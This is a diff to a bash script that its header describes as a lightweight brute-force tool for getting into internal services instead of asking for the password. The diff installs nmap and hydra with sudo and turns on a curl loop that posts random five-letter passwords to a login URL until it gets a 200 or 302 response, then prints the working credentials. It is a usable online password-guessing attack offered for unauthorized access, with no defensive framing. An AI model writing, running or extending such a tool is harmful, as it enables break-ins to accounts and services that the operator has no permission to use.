@@ -1,11 +1,17 @@
 #!/bin/bash
 # ------------------------------
+# ABOUT:
 # Lightweight brute-force for access to not-so-important inner services.
 # Oftentimes it's much faster than asking and useless waiting for dumb password for required service.
 # Author: me :)
 #
 # Zero-config, use only CLI arguments.
-# Usage: CMD username:@http://example.com/ [:password@https://domain.com/ [www.domain.com/path]]
+#
+# USAGE:
+# CMD username:@http://example.com/ [:password@https://domain.com/ [www.domain.com/path]]
+#
+# NOTES:
+# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
 # ------------------------------
 
 if [[ -f "$HOME/.config/automa-sh-ion/.config" ]]; then
@@ -23,8 +29,16 @@ VERSION='0.0.1'
 HELP='Usage: CMD username:@http://example.com/ [:password@https://domain.com/ [www.domain.com/path]]'
 
 if [[ $# -eq 0 ]]; then
-    echo -e "${COLOR_RED}Invalid call syntax${COLOR_RESET}"
+    echo -e "${COLOR_RED}Invalid call syntax!${COLOR_RESET}"
     echo "$HELP"
+
+    exit 1
+fi
+
+if sudo apt-get update && sudo apt-get install -y nmap hydra; then
+    echo -e "${COLOR_GREEN}Required installations done!${COLOR_RESET}"
+else
+    echo -e "${COLOR_RED}Required installations failed!${COLOR_RESET}"
 
     exit 1
 fi
@@ -54,14 +68,20 @@ function generate () {
 for target in "${!targets_map[@]}"; do
     url=$target
     credentials=${targets_map[$target]}
+    login=$(echo $credentials | cut -f 1 -d :)
+    password=$(echo $credentials | cut -f 2 -d :)
 
     echo "$url"
-    echo "$credentials"
+    echo "$login"
+    echo "$password"
 
-#    http_response_code=$(curl -L --data-urlencode user="$login" --data-urlencode password="$password" "$url" -w '%{http_code}' -o /dev/null -s)
-#
-#    if [[ "$http_response_code" -eq 200 ]]; then
-#        echo -e "${COLOR_GREEN}Success: $target $login $password.${COLOR_RESET}"
-#        break 2
-#    fi
+    http_response_code=$(curl --data "username=$login&password=$password" "$url" -w '%{http_code}' -o /dev/null -s)
+
+    while [[ "$http_response_code" -ne 200 && "$http_response_code" -ne 302 ]]; do
+        password=$(tr -dc a-z < /dev/urandom | head -c 5 | xargs)
+        http_response_code=$(curl --data "username=$login&password=$password" "$url" -w '%{http_code}' -o /dev/null -s)
+    done
+
+    echo -e "${COLOR_GREEN}Success: $target [$login:$password].${COLOR_RESET}"
+    break 2
 done
